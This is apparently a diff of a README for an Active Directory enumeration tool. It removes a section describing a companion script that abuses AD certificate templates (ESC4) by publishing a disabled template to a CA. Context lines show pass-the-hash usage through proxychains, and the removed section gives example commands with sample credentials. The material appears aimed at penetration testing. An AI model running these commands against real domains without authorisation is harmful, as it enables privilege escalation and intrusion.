@@ -236,31 +236,6 @@ python ad_enum.py --dc-ip 10.10.10.1 --domain corp.local -u 'jdoe' -p 'Password1
 proxychains python ad_enum.py --dc-ip 172.16.5.5 --domain internal.corp -u 'svc_account' \
     --hashes :a87f3a337d73085c45f9416be5787d86 --report
 ```
-
----
-
-## Companion Tools
-
-This repo includes additional tooling for AD CS (ADCS) abuse:
-
-### `esc4_enable_template.py` — ESC4 Certificate Template Abuse
-
-Publish a disabled certificate template to a CA via `WriteProperty` (ESC4).
-
-```bash
-# Check which CAs host a template
-python esc4_enable_template.py --dc-ip 10.10.10.1 --domain corp.local \
-    -u jdoe -p 'P@ssw0rd' --check --template KeyRecoveryAgent
-
-# Publish the template to a CA
-python esc4_enable_template.py --dc-ip 10.10.10.1 --domain corp.local \
-    -u jdoe -p 'P@ssw0rd' --template KeyRecoveryAgent --ca 'CORP-CA'
-
-# Restore (remove from CA)
-python esc4_enable_template.py --dc-ip 10.10.10.1 --domain corp.local \
-    -u jdoe -p 'P@ssw0rd' --template KeyRecoveryAgent --ca 'CORP-CA' --disable
-```
-
 ---
 
 ## Legal Disclaimer
